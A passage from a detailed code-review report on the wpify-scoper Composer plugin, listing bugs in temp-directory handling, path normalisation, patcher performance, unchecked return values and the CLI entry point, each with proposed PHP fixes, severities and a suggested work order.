$prefix = strtolower( preg_replace( '/[^a-zA-Z0-9]+/', '', $cfg['prefix'] ) );
```

(and, better, use a stable hash: `substr( md5( $cfg['prefix'] ), 0, 8 ) . '_'` — immune to
casing, separators and length).

**Benefit.** Predictable, injection-safe identifier prefix; the code says what it means.
**Downside.** Changes the `$files` identifiers for prefixes containing separators, so one
rebuild is needed. Harmless (identifiers are regenerated every run).
**Severity:** Medium. **Effort:** S.

---

## 14. Temp directory: weak randomness, project-dir pollution, no cleanup on failure

**Location:** `src/Plugin.php:58`

```php
'temp' => $this->path( getcwd(), 'tmp-' . substr( str_shuffle( md5( microtime() ) ), 0, 10 ) ),
```

**14a — Weak randomness.** `str_shuffle()` uses the non-cryptographic Mt19937 engine, and it
shuffles a *fixed 32-character multiset* (the md5 hex digest). Taking the first 10 characters of
a shuffle of a known multiset yields far less entropy than 10 independent hex characters. Since
the directory sits inside the project (not a world-writable `/tmp`), this is a robustness and
collision concern rather than a classic symlink-attack vector — but on a **shared CI runner with
a shared checkout**, or with two Composer processes started in the same microsecond, two runs can
collide and clobber each other's `source/`, `destination/` and `postinstall.php`.

**14b — `mkdir()` is unchecked and racy.** `createFolder()` (`src/Plugin.php:278-282`):

```php
if ( ! file_exists( $path ) ) {
    mkdir( $path, 0755, true );
}
```

Classic TOCTOU, and the return value is dropped. If `mkdir` fails (permissions, read-only
filesystem, path length limit on Windows — `MAX_PATH` is very reachable given
`tmp-XXXXXXXXXX/source/vendor/…`), execution continues and every subsequent
`file_put_contents()` fails silently, ending in confusing downstream errors.

**14c — Never cleaned up on failure.** `remove($temp)` exists **only** at
`scripts/postinstall.php:67`, the last line of the happy path. Every failure mode above
(#5, #6, #7, #8, #9, #11, #12) leaves a `tmp-XXXXXXXXXX/` directory in the project root
containing a full `vendor/` tree — hundreds of MB. There is no `register_shutdown_function`, no
`try/finally`, and no signal handling, so Ctrl-C during the nested install always orphans one.
Repeated failed runs accumulate them, each with a *different* random name.

**14d — `.gitignore` burden.** Because the name is random, users cannot ignore a fixed path;
they need a `tmp-*` glob, which the README does not mention. Orphaned trees get committed or
break `git status` hygiene.

**14e — Computed once in `activate()`, used per event.** `$this->tempDir` is fixed at activation.
This is fine for the single-event-per-process reality (see #19) but means two `execute()` calls in
one process would share and then delete the same temp dir mid-flight.

**Fix.**

```php
// activate()
'temp' => $this->path( getcwd(), '.wpify-scoper-tmp-' . bin2hex( random_bytes( 6 ) ) ),
```

```php
// createFolder()
private function createFolder( string $path ) {
    if ( is_dir( $path ) ) {
        return;
    }

    if ( ! mkdir( $path, 0755, true ) && ! is_dir( $path ) ) {
        throw new \RuntimeException( sprintf( 'wpify-scoper: cannot create directory %s', $path ) );
    }
}
```

```php
// execute()
register_shutdown_function( function () {
    if ( is_dir( $this->tempDir ) ) {
        $this->removeDirectory( $this->tempDir );
    }
} );
```

and move the `remove($temp)` responsibility out of `postinstall.php` (it currently deletes the
script it is executing from — which works on POSIX but is fragile on Windows, where the file may
be locked). Document a `.gitignore` entry, or use a single fixed dot-prefixed parent
(`.wpify-scoper/<random>`) so one `.gitignore` line covers it.

**Benefit.** No leaked multi-hundred-MB trees; no collisions; a single ignorable path.
**Downside.** `register_shutdown_function` will not fire on `SIGKILL`; acceptable.
**Severity:** Medium. **Effort:** M.

---

## 15. The patcher rebuilds a 3,392-needle `str_replace` for every single file

**Location:** `config/scoper.inc.php:79-103`

```php
usort( $config['exclude-classes'], function ( $a, $b ) { return strlen( $b ) - strlen( $a ); } );

$searches = array(); $replacements = array();

foreach ( $config['exclude-classes'] as $symbol ) { /* 2 entries each */ }
foreach ( $config['exclude-namespaces'] as $symbol ) { /* 2 entries each */ }

$content = str_replace( $searches, $replacements, $content, $count );
```

This is inside the patcher closure, so it runs **once per patched file**.

**Measured** (this machine, PHP 8.x, default globals `wordpress` + `woocommerce` +
`action-scheduler` + `wp-cli`, giving 1,219 `exclude-classes` and 477 `exclude-namespaces` →
**3,392 needles**), against a 14 KB synthetic PHP file:

| step | per file |
|---|---|
| `usort` (first call, unsorted) | 0.33 ms |
| `usort` (subsequent, already sorted) | 0.23 ms |
| building `$searches`/`$replacements` | 0.14 ms |
| `str_replace` with 3,392 needles | **4.27 ms** |
| **total** | **~4.65 ms** |

Extrapolated: **~23 s for 5,000 files, ~90 s for 20,000 files** of pure patcher overhead, on top
of php-scoper's own parsing. Cost scales with file size, so a real vendor tree (many files far
larger than 14 KB) will be worse.

**Correction to the premise:** the `usort` is *not* the dominant cost. `$config` is captured
**by value** via `use ($config)`, and the closure instance is reused, so the array stays sorted
after the first call — subsequent sorts are the near-best case (0.23 ms, ~5 % of the total).
The real cost is `str_replace` itself (92 %), which is inherent to the approach, plus the array
rebuild (3 %).

**Fix.** Hoist everything invariant out of the closure:

```php
$excludeClasses    = $config['exclude-classes'] ?? array();
$excludeNamespaces = $config['exclude-namespaces'] ?? array();

usort( $excludeClasses, static fn( $a, $b ) => strlen( $b ) - strlen( $a ) );

$searches     = array();
$replacements = array();

foreach ( array_merge( $excludeClasses, $excludeNamespaces ) as $symbol ) {
    $searches[]     = "\\$prefix\\$symbol";
    $replacements[] = "\\$symbol";
    $searches[]     = "use $prefix\\$symbol";
    $replacements[] = "use $symbol";
}

'patchers' => array(
    function ( string $filePath, string $prefix, string $content ) use ( $searches, $replacements ): string {
        ...
        return str_replace( $searches, $replacements, $content );
    },
),
```

That reclaims the 0.37 ms/file of sort+build (~8 %). For the remaining 92 %, the real win is a
**single `preg_replace_callback`** over `\\?Prefix\\([A-Za-z0-9_\\]+)` with an
`isset($excludedLookup[$symbol])` hash test — one pass over the content instead of 3,392, and
it also fixes a correctness issue: `str_replace` with `"\\$prefix\\$symbol"` matches on prefixes,
so an excluded class `WP` will also rewrite `\Prefix\WPSomethingElse` → `\WPSomethingElse`. The
length-descending `usort` is a partial mitigation for that, but only a partial one — it does not
help when the shorter symbol is a strict prefix of an unrelated *unlisted* name.

Also note `$count` (`config/scoper.inc.php:83,103`) is assigned and never read — dead.

**Benefit.** Roughly an order of magnitude off the patcher for large trees, plus removal of a
real prefix-collision correctness bug.
**Downside.** The `preg_replace_callback` rewrite needs test coverage; the `str_replace` version
is easier to reason about. Doing only the hoist is a safe, zero-risk first step.
**Severity:** Medium. **Effort:** M (S for the hoist alone).

---

## 16. `path()` collapses only a single doubled separator and mangles absolute inputs

**Location:** `src/Plugin.php:110-114`

```php
public function path( ...$parts ) {
    $path = join( DIRECTORY_SEPARATOR, $parts );

    return str_replace( DIRECTORY_SEPARATOR . DIRECTORY_SEPARATOR, DIRECTORY_SEPARATOR, $path );
}
```

**Verified behaviour:**

| call | result |
|---|---|
| `path('/cwd', '/abs/deps')` | `/cwd/abs/deps` — **absolute input silently made relative** |
| `path('/cwd', 'deps/')` | `/cwd/deps/` — trailing separator preserved |
| `path('/cwd', 'a//b')` | `/cwd/a/b` |
| `path('/cwd', 'a///b')` | `/cwd/a//b` — **only one pass**, triples survive |

**Consequences.**

- **Absolute `folder`/`temp` are silently relocated.** `"folder": "/var/www/shared/deps"` becomes
  `<project>/var/www/shared/deps`. The README does not say `folder` must be relative, so this is
  a real trap; the user gets a deeply nested directory in their project with no error.
- **Windows absolute paths are destroyed.** `path(getcwd(), 'C:\deps')` → `C:\proj\C:\deps`,
  which is not a valid path at all.
- **Trailing separators propagate into the generated `postinstall.php`** and, on Windows, produce
  the unterminated-string parse error described in #8b.
- The single-pass collapse means `str_replace` cannot normalise `a///b`, so odd user input leaks
  through into the php-scoper `--config`/`--output-dir` arguments.

**Fix.**

```php
public function path( ...$parts ) {
    $parts = array_filter( $parts, static fn( $p ) => '' !== $p && null !== $p );
    $path  = join( DIRECTORY_SEPARATOR, $parts );

    return rtrim( preg_replace( '#[/\\\\]+#', DIRECTORY_SEPARATOR, $path ), DIRECTORY_SEPARATOR );
}
```

and add an explicit absolute-path check at the call sites in `activate()`:

```php
private function resolve( string $value ): string {
    $isAbsolute = '' !== $value
        && ( $value[0] === '/' || $value[0] === '\\' || preg_match( '#^[A-Za-z]:[\\\\/]#', $value ) );

    return $isAbsolute ? $this->path( $value ) : $this->path( getcwd(), $value );
}
```

**Benefit.** Absolute `folder`/`temp` work as users expect; Windows paths survive; no trailing
separators leak downstream.
**Downside.** `rtrim` changes results for anyone currently depending on a trailing separator
(nothing in the codebase does). Absolute-path support is a behaviour change — but the current
behaviour is not something anyone can be depending on deliberately.
**Severity:** Medium. **Effort:** S.

---

## 17. `getCapabilities()` is dead code

**Location:** `src/Plugin.php:104-108`

```php
public function getCapabilities() {
    return array( CommandProvider::class => self::class );
}
```

Verified: `src/Plugin.php:16` declares
`class Plugin implements PluginInterface, EventSubscriberInterface` — **not**
`Composer\Plugin\Capable` (which does exist in the installed Composer,
`vendor/composer/composer/src/Composer/Plugin/Capable.php:22`). Composer's `PluginManager` only
calls `getCapabilities()` on `Capable` instances, so this method is never invoked.

Worse, if `Capable` were added, the declaration is wrong twice over: it maps to `self::class`,
and `Plugin` does not implement `Composer\Plugin\Capability\CommandProvider::getCommands()`.
Composer would throw
`RuntimeException: Plugin Wpify\Scoper\Plugin must implement Composer\Plugin\Capability\CommandProvider`.

This is the root cause of #4 (the `NO_DEV` constants being unreachable): there is no Composer
command registration at all, only `bin/wpify-scoper`.

**Fix.** Either delete `getCapabilities()` and the unused `CommandProvider` import
(`src/Plugin.php:9`), or implement it properly:

```php
class Plugin implements PluginInterface, EventSubscriberInterface, Capable {
    public function getCapabilities() {
        return array( CommandProvider::class => CommandsProvider::class );
    }
}
```

with a separate `CommandsProvider implements CommandProvider` returning `wpify-scoper:install` /
`wpify-scoper:update` commands that carry a real `--no-dev` option.

**Benefit.** Either less misleading code, or first-class `composer wpify-scoper:update --no-dev`.
**Downside.** Implementing it properly is the M-effort half of #4.
**Severity:** Medium. **Effort:** S (delete) / M (implement).

---

## 18. Empty `prefix` is a silent no-op

**Location:** `src/Plugin.php:127`

```php
if ( ! empty( $this->prefix ) ) {
    // ... the entire body of execute()
}
```

`$prefix` defaults to `null` (`src/Plugin.php:55,59`) and is only set from
`extra.wpify-scoper.prefix`. If a user forgets it, misspells the `extra` key
(`wpify_scoper`, `wpify-scoper.prefix` nested wrongly), or writes `"prefix": ""`, **`composer
install` completes normally and nothing at all happens** — no message, no warning, no `deps/`
folder. The README's step 3 makes `prefix` the one mandatory option, so this is the single most
likely first-run mistake, and it produces zero feedback.

`empty()` also rejects the string `"0"` — a legal (if silly) prefix.

**Fix.**

```php
if ( empty( $this->prefix ) ) {
    $this->io->writeError(
        '<warning>wpify-scoper: extra.wpify-scoper.prefix is not set — skipping dependency scoping.</warning>'
    );

    return;
}
```

`$this->io` is already stored in `activate()` (`src/Plugin.php:53`) and is currently never used
anywhere in the class — this is a good first use. Combine with the prefix validation from #8.

**Benefit.** The most common misconfiguration becomes self-diagnosing.
**Downside.** A warning on every install for users who intentionally have the plugin installed
but unconfigured. Gate it on the `extra.wpify-scoper` key being present at all if that matters.
**Severity:** Medium. **Effort:** S.

---

## 19. `require_once` in `createScoperConfig()` returns `true` on a second include → `exit`

**Location:** `src/Plugin.php:212-216`

```php
$config = require_once $config_path;

if ( ! is_array( $config ) ) {
    exit;
}
```

`require_once` returns the file's return value **only on the first inclusion**. On any subsequent
inclusion in the same process it returns `true` (having done nothing), so `$config === true`,
`is_array()` fails, and the plugin calls a bare **`exit;`** — terminating the entire Composer
process with status 0, mid-run, with no output whatsoever.

**When can `createScoperConfig()` run twice in one process?** I traced this carefully:

- `composer install` dispatches `POST_INSTALL_CMD` once; `composer update` dispatches
  `POST_UPDATE_CMD` once. Neither dispatches both. So the default path calls `execute()` once.
- The nested `runInstall()` constructs a fresh `Composer\Console\Application` **in the same PHP
  process**. That nested Composer builds its own `EventDispatcher` and its own `PluginManager`
  from `$temp/source`, so `Wpify\Scoper\Plugin` is not re-registered there — unless
  `composer-deps.json` itself requires `wpify/scoper`, or the user has it installed as a
  **global** Composer plugin (globals are loaded by every Composer instance). In the global case
  `execute()` *does* run again in the same process and hits the `exit`.
- `bin/wpify-scoper` calls `activate()` + `execute()` exactly once.

**UNCONFIRMED:** I did not reproduce a double invocation end-to-end. The global-plugin path is
the most plausible trigger and follows from Composer's plugin loading, but I have not verified it
against a real global install. What *is* certain is that the code has no defence and that the
failure mode — a bare `exit` from inside a library — is severe out of proportion to its
likelihood.

Regardless of reachability, **`exit` inside a Composer plugin is wrong**: it bypasses Composer's
error reporting, its shutdown handlers, and its exit-code contract, so the caller sees success.

**Fix.**

```php
$config = require $config_path;   // plain require: always returns the value

if ( ! is_array( $config ) ) {
    throw new \RuntimeException( sprintf(
        'wpify-scoper: %s must return an array.', $config_path
    ) );
}
```

`config/scoper.config.php` is a pure `return array(...)` with no side effects
(`config/scoper.config.php:3-7`), so `require` is safe and idempotent.

The same pattern exists at `config/scoper.inc.php:5`
(`$config = require_once __DIR__ . '/scoper.config.php';`) — that file runs in its own php-scoper
process so the risk is lower, but it should be `require` for the same reason.

**Benefit.** Removes a silent whole-process abort; makes the include order-independent.
**Downside.** None.
**Severity:** Medium. **Effort:** S.

---

## 20. `array_merge_recursive` on the plugin side never de-duplicates

**Location:** `src/Plugin.php:223-256`

```php
$config = array_merge_recursive( $config, require $this->path( $symbols_dir, 'wordpress.php' ) );
```

**Semantics.** All symbol files use list-style (numeric) keys under `exclude-classes`,
`exclude-functions`, `exclude-namespaces`, `exclude-constants`, so `array_merge_recursive`
renumbers and **appends** — the correct behaviour here. The string keys already in `$config`
(`prefix`, `source`, `destination`) are not present in the symbol files, so there is no
string-key-collision-into-array surprise. **This part is fine.**

**The gap.** `scripts/extract-symbols.php:137-140` applies `array_unique()` *within* each source,
but the plugin never applies it *across* sources. WordPress and WooCommerce overlap
substantially (WooCommerce redeclares WP-adjacent helpers, and both list overlapping namespaces),
so the merged arrays carry duplicates straight into:

- `var_export()` into `$temp/scoper.config.php` (`src/Plugin.php:263`) — a larger file parsed by
  php-scoper on every run,
- the `$searches`/`$replacements` arrays in the patcher (#15) — duplicated needles are pure waste
  on the hot path,
- php-scoper's own symbol tables.

**Measured scale (not the ~200k claimed):** `symbols/wordpress.php` holds **5,332** symbols
(4,190 functions / 540 constants / 524 classes / 78 namespaces); `woocommerce.php` **1,994**;
`wp-cli.php` **75**; `action-scheduler.php` **93**; `plugin-update-checker.php` **33**. Total
under **7,600** across all five. Memory/parse cost is therefore modest — a few MB — and this is
**not** a performance problem worth restructuring for. The duplication is a correctness/tidiness
issue that also feeds #15.

**Fix.**

```php
foreach ( array( 'exclude-classes', 'exclude-functions', 'exclude-constants', 'exclude-namespaces' ) as $key ) {
    if ( isset( $config[ $key ] ) ) {
        $config[ $key ] = array_values( array_unique( $config[ $key ] ) );
    }
}
```

immediately before `var_export()` at `src/Plugin.php:263`. This also happens to seed the keys
needed for #5 if combined with a `+=` default.

Separately, `symbols/wp-cli.php` was extracted from `vendor/wp-cli/wp-cli`
(`scripts/extract-symbols.php:155`) and contains **test-suite classes** — `WpOrgApiTest`,
`InflectorTest`, `SynopsisParserTest`, `ProcessTest`, `UtilsTest`, `FileCacheTest`,
`MockRegularLogger`, `MockQuietLogger`. These are not WP-CLI runtime API and should not be in the
exclusion list; they widen the prefix-collision surface described in #15. `get_files()`
(`scripts/extract-symbols.php:94`) filters `/vendor/` and `/wp-content/` but not `/tests/`.

**Benefit.** Smaller generated config, fewer needles on the hot path, no bogus test-class
exclusions.
**Downside.** None.
**Severity:** Low. **Effort:** S.

---

## 21. `symbols/plugin-update-checker.php` uses `expose-classes`, which is then neutralised

**Locations:** `symbols/plugin-update-checker.php`, `config/scoper.inc.php:108-110`,
`scripts/postinstall.php:51-52`

Verified: `symbols/plugin-update-checker.php` is the only symbol file using **`expose-classes`**
(33 entries); every other file uses `exclude-*`. The pipeline then works against it:

- `config/scoper.inc.php:108-110` sets `expose-global-classes` / `-functions` / `-constants` to
  `false`;
- `scripts/postinstall.php:51-52` **comments out every `humbug_phpscoper_expose_*` call and every
  single-line `if (!function_exists(...)) {...}` block** in `vendor/scoper-autoload.php` — the
  very mechanism `expose-classes` relies on.

So enabling `"globals": ["plugin-update-checker"]` asks php-scoper to expose 33 classes and then
deletes the aliases that would expose them. Combined with #5 (that file supplies no
`exclude-classes`), the option is doubly broken: it fatals before it can even be wrong.

**UNCONFIRMED:** whether the `expose-classes` entries were intentional (an earlier design where
PUC classes had to stay global for cross-plugin compatibility) or a copy-paste slip. The
`extract_symbols` call for PUC is commented out at `scripts/extract-symbols.php:153`, suggesting
the file is hand-maintained and stale.

**Fix.** Decide the intent. If PUC should be scoped like everything else, regenerate the file
with `exclude-*` keys (and re-enable line 153 pointed at the current PUC version — note the
commented line targets `Puc/v4p11` while `vendor/composer/autoload_static.php` shows the
installed package is `load-v5p7.php`). If PUC classes genuinely must stay global, `exclude-*`
is still the right key — `expose-*` plus the postinstall commenting cannot work.

**Benefit.** A documented `globals` value stops being a guaranteed crash.
**Downside.** Requires deciding on PUC semantics, which needs product knowledge I do not have.
**Severity:** Low (as a bug it is subsumed by #5; as a design inconsistency it is worth fixing).
**Effort:** S.

---

## 22. `autorun` uses strict `=== false`

**Location:** `src/Plugin.php:119-125`

```php
if (
    isset( $extra['wpify-scoper']['autorun'] ) &&
    $extra['wpify-scoper']['autorun'] === false &&
    ( $event->getName() === ScriptEvents::POST_UPDATE_CMD || $event->getName() === ScriptEvents::POST_INSTALL_CMD )
) {
    return;
}
```

`"autorun": 0`, `"autorun": "false"`, `"autorun": "0"`, `"autorun": null` all fail the strict
comparison, so scoping runs anyway. JSON booleans are the documented form
(`README.md:57` shows `"autorun": true`), so most users will be fine — but the failure is silent
and the user's stated intent is inverted.

Note the event-name guard is *correct*: it deliberately lets `bin/wpify-scoper`'s
`SCOPER_*_CMD` events through, so manual runs still work with `autorun: false`. Good design,
worth a comment.

Minor: `$extra` is re-read from the event (`src/Plugin.php:117`) while every other config value
comes from `activate()`. Both read `$composer->getPackage()->getExtra()` on the same root
package, so the values are identical — this is a consistency wart, not a bug. Reading it once in
`activate()` into `$this->autorun` would be cleaner.

**Fix.**

```php
$autorun = filter_var(
    $extra['wpify-scoper']['autorun'] ?? true,
    FILTER_VALIDATE_BOOLEAN,
    FILTER_NULL_ON_FAILURE
);

if ( false === $autorun && in_array( $event->getName(), array( ScriptEvents::POST_UPDATE_CMD, ScriptEvents::POST_INSTALL_CMD ), true ) ) {
    return;
}
```

**Benefit.** Honours the user's intent for the common truthy/falsy spellings.
**Downside.** None.
**Severity:** Low. **Effort:** S.

---

## 23. Enumeration of unchecked return values

Complete list, with the concrete consequence of each failure.

### `src/Plugin.php`

| Line | Call | Consequence when it fails |
|---|---|---|
| 135 | `file_get_contents( composerjson )` | `false` → `json_decode(false)` → `null` → **fatal**, see #6 |
| 135 | `json_decode(...)` | `null` on malformed JSON → **fatal**, see #6 |
| 141 | `createJson(...)` | Silent; next run re-creates it |
| 148 | `file_get_contents( postinstall.php )` | `false` → all `str_replace` no-ops → `file_put_contents` writes `""` → the composer script runs an **empty `postinstall.php`**: php-scoper and dump-autoload succeed, `deps/` is never updated, and the run reports success |
| 157 | `file_put_contents( postinstallPath )` | Silent; script step 3 fails with "file not found", composer aborts, temp dir orphaned |
| 167 | `realpath( php-scoper.phar )` | `false` → malformed command, see #11 |
| 178 | `copy( lock, composerLockPath )` | Silent; nested install resolves from scratch, producing a **different dependency set than the lock intended** — a reproducibility bug, not just a slowdown |
| 197 | `runInstall(...)` return | Failure reported as success, see #12 |
| 259 | `copy( custom_path, temp )` | Silent; `scoper.custom.php` customisations silently not applied — `config/scoper.inc.php:9` just skips the missing file, so the user's patchers vanish with no message |
| 262 | `copy( inc_path, temp )` | Silent; php-scoper then fails with "config file not found" |
| 263 | `file_put_contents( scoper.config.php )` | Silent; `config/scoper.inc.php:5` requires a missing file → **fatal in the php-scoper process** |
| 280 | `mkdir(...)` | Silent, racy — see #14b |
| 286 | `json_encode(...)` | `false` on invalid UTF-8 or recursion → writes `""` → nested Composer fails on an empty `composer.json` |
| 287 | `file_put_contents( json )` | Silent; same |

`createJson()` (`src/Plugin.php:284-288`) is worth special mention: it is the function that writes
the nested `composer.json`, and neither its `json_encode` nor its `file_put_contents` is checked.
An invalid-UTF-8 string anywhere in the user's `composer-deps.json` (a package description with a
bad byte, for instance) silently produces a zero-byte `composer.json`.

### `scripts/postinstall.php`

| Line | Call | Consequence when it fails |
|---|---|---|
| 4 | `opendir( $src )` | `false` → `readdir(false)` → **TypeError**, abort mid-delete leaving a partial tree |
| 6 | `readdir(...)` | A read error is indistinguishable from end-of-directory → silent partial delete, then `rmdir` fails, leaving a partial tree |
| 12 | `unlink( $full )` | Silent; `rmdir` then fails |
| 18 | `rmdir( $src )` | Silent; empty dirs accumulate |
| 40 | `file_get_contents( autoload_static )` | Truncates the file to zero bytes, see #9 |
| 46 | `file_put_contents( autoload_static )` | Silent; the `$files` fix is not applied → **duplicate-bootstrap bugs at runtime**, the exact problem this script exists to prevent |
| 50 | `file_get_contents( scoper_autoload )` | Truncates, see #9 |
| 53 | `file_put_contents( scoper_autoload )` | Silent; exposed symbols leak into the global namespace |
| 58 | `copy( destination/composer.lock, cwd/lock )` | The lock was already deleted at line 57 → **the user's lock file is gone** and not replaced; the next run resolves from scratch |
| 63 | `rename(...)` | Catastrophic, see #1 |

**Fix.** A single guard helper used everywhere, and `exit(1)` on any failure so composer aborts
the chain:

```php
function must( $result, string $what ) {
    if ( false === $result || null === $result ) {
        fwrite( STDERR, "wpify-scoper: {$what} failed\n" );
        exit( 1 );
    }

    return $result;
}
```

For `src/Plugin.php`, throw `RuntimeException` (Composer renders it cleanly) rather than
`exit`.

**Benefit.** Every failure becomes visible and stops the pipeline before it can do damage.
Several of these currently produce *silently wrong output* rather than an error, which is the
worst kind of failure for a build tool.
**Downside.** More code; some previously "working" runs will start failing loudly.
**Severity:** Low individually, Medium–High in aggregate. **Effort:** M.

---

## 24. `bin/wpify-scoper` issues

**Location:** `bin/wpify-scoper`

**24a — `NullIO` swallows everything.** Line 31: `$ioInterace = new NullIO();`. `NullIO::isInteractive()` returns `false` and every prompt returns its default. Consequences:

- Authentication prompts for private repositories in `composer-deps.json` cannot be answered —
  the run fails with an opaque error instead of asking for credentials.
- Composer warnings raised while building the root `Composer` object (deprecated config, platform
  checks, `allow-plugins` prompts) are discarded.

Note the *nested* install does print, because `runInstall()` builds its own `ConsoleOutput`
(`src/Plugin.php:291`) — so output is inconsistent: nothing from the outer setup, everything from
the inner install.

**Fix:** `new ConsoleIO( new ArgvInput(), new ConsoleOutput(), new HelperSet() )`, or
`Factory::createOutput()` + `ConsoleIO`.

**24b — No exit code.** The script ends at line 41 with no `exit()`. Always returns 0. See #12.

**Fix:** `exit( (int) $scoper->execute( $fakeEvent ) );` once `execute()` returns a code.

**24c — `argv` beyond `$argv[1]` ignored.** No `--no-dev`, no `--working-dir`, no `-v`, no
`--help`. `wpify-scoper install --no-dev` silently installs dev dependencies (#4).
`wpify-scoper install extra garbage` silently ignores the extras.

**Fix:** Use `Symfony\Component\Console\Input\ArgvInput` with a defined `InputDefinition`, or a
tiny `getopt()`. At minimum, reject unknown arguments.

**24d — `$vendorRoot = __DIR__ . '/../../..'` (line 9).** Assumes installation at
`vendor/wpify/scoper/bin/`. Running `./bin/wpify-scoper` from a clone resolves to the parent of
the project and fails on `require_once $vendorRoot . '/autoload.php'` with a fatal
"Failed opening required". Composer's generated `vendor/bin/` proxy makes the installed case work,
so this only bites contributors — but it bites them with an unhelpful error.

**Fix:**

```php
$autoloads = array(
    __DIR__ . '/../vendor/autoload.php',   // standalone clone
    __DIR__ . '/../../../autoload.php',    // installed in vendor/
);

foreach ( $autoloads as $autoload ) {
    if ( is_file( $autoload ) ) {
        require_once $autoload;
        break;
    }
}

if ( ! class_exists( Plugin::class ) ) {
    fwrite( STDERR, "wpify-scoper: could not locate the Composer autoloader.\n" );
    exit( 1 );
}
```

**24e — `Factory::createComposer()` is not wrapped.** A missing or invalid root `composer.json`
throws an uncaught exception with a full stack trace instead of a message.

**Benefit (all of 24).** The CLI entry point becomes usable in release scripts: it reports
failures, supports `--no-dev`, and works from a clone.
**Downside.** None.
**Severity:** Low (Medium once #4 and #12 are fixed, since this is where the flags must live).
**Effort:** S.

---

## Suggested order of work

1. **#1, #2** — stop the data-loss paths. Small, self-contained, highest value.
2. **#5, #6, #9, #11** — cheap guards that turn fatals into messages.
3. **#7** — one-line-ish fix for a first-run blocker on macOS/Windows.
4. **#12, #18** — make failures and misconfiguration visible.
5. **#3** — the correctness bug with the widest blast radius, but needs care and a test.
6. **#4, #17** — decide the command-provider story and fix `--no-dev` together.
7. **#8** — replace templating with a JSON side-car; unlocks linting/testing `postinstall.php`.
8. **#13, #14, #15, #16, #20, #23** — hardening and performance.
9. **#21, #22, #24** — cleanups.

## Testing gap

There is no test suite. Every finding above was reachable by reading, which means none of them
would have been caught by CI. The highest-leverage structural change is a single integration
fixture: a tiny `composer-deps.json` (one dependency with a `files` autoload entry and one global
polyfill stub), scoped end to end, asserting that

- `deps/composer/autoload_static.php` has prefixed `$files` keys and **unmodified `$classMap`
  keys** (#3),
- `deps/` exists and the temp dir does not (#1, #14),
- a non-zero nested exit code propagates (#12),
- `globals: []` completes without a fatal (#5).

That fixture alone would have caught #1, #3, #5, #9 and #12.
